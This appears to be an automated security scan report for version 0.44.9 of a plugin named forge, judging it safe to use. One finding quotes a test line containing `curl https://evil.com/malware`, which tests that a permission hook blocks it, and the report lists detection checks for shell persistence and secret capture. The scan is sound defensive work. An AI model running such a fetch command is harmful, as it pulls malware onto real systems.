# Security Scan — forge:forge — 2026-05-21

**SHA**: not recorded (source-path scan against working tree at `/home/boni/src/forge-engineering/forge/forge/`)
**Installed**: n/a (scanning source, not installed plugin cache)
**Last updated**: 2026-05-21
**Scope**: source-path
**Install path**: `/home/boni/src/forge-engineering/forge/forge/`

### Summary

306 files scanned | **0 critical** | **0 warnings** | **2 info**

Delta from v0.44.8 → v0.44.9:
- `forge/commands/regenerate.md` — added pre-write `generation-manifest check` + prompt to personas and skills regenerate paths (single-file and full-rebuild). Closes forge#106 / FORGE-BUG-037.
- `forge/.claude-plugin/plugin.json` — version bump.
- `forge/migrations.json` — new top entry.
- `CHANGELOG.md` — new section.
- `forge/integrity.json` — re-generated by `gen-integrity.cjs`.

No new patterns introduced. Delta is markdown-only behavioural change + version metadata.

### Findings

#### [INFO] `forge/commands/health.md`:173
- **Check**: B (long base64-looking blob)
- **Issue**: 64-char hex blob matches the `[A-Za-z0-9+/=]{40,}` warning pattern.
- **Excerpt**: `EXPECTED="3ec3c970dd3d7c3001f8f373bcc40556803eadd2fc2afafb14f1c232cba4cc3f"`
- **Recommendation**: False positive. This is the SHA-256 of `verify-integrity.cjs`, computed by the health gate. Required and verified each release (Gate 4).

#### [INFO] `forge/tools/__tests__/*` and `forge/hooks/__tests__/*`
- **Check**: A (network calls / credential paths)
- **Issue**: Test fixtures reference `https://evil.com`, `https://example.com`, JSON schema URLs, and `CLAUDE_PLUGIN_*` env vars.
- **Excerpt**: e.g. `assert.equal(matchTool('Bash', { command: 'curl https://evil.com/malware' }), null);` — negative-match test asserting the permission hook BLOCKS such calls.
- **Recommendation**: False positives. All hits are inside `__tests__/` and are test inputs validating the security-permissions hook does the right thing. None of the strings appear in runtime code.

### Clean Areas

- **Check A (hooks + tools, runtime code)** — zero hits on: eval / base64-decode-to-shell / shell init writes / persistence (cron, systemctl, launchctl) / silent installers (apt, brew, npm -g, pip, cargo) / secret-env-var capture.
- **Check A (network calls in runtime)** — only `hooks/check-update.js` makes outbound calls, to the `updateUrl` declared in `plugin.json` (`raw.githubusercontent.com/Entelligentsia/forge/...`), which is the intended version-check endpoint.
- **Check B (markdown)** — 184 `.md` files scanned. Zero prompt-injection phrases, zero zero-width / BOM characters, zero suspicious frontmatter mismatches.
- **Check C (permissions)** — `hooks/hooks.json` registers four local `node` invocations of bundled plugin scripts via `${CLAUDE_PLUGIN_ROOT}/...`, each with bounded timeouts (3–10s). No `bash -c` interpolation. No `allowed-tools: ["Bash"]`/`["Write"]` without restriction in any frontmatter.
- **Check D (structure)** — no compiled artifacts (`.pyc`, `.so`, `.class`, `.exe`, `.dylib`, `.dll`). Total size 3.0 MB across 306 files — consistent with prior v0.43.19 baseline (318 files). File types confined to: ASCII / UTF-8 text, JavaScript source, Node.js script executables, JSON, exported SGML (markdown with extended chars), Python (one script: `tools/banners.cjs` shebang variants), Bourne-Again shell (one: `tools/banners.sh`). All expected.

### Verdict

**SAFE TO USE**

Markdown-only behavioural fix in `commands/regenerate.md`. No new code paths, no new network calls, no new permissions. Delta inspected line-by-line against the v0.44.8 baseline — exclusively additive guard text plus version metadata. Runtime risk surface unchanged.
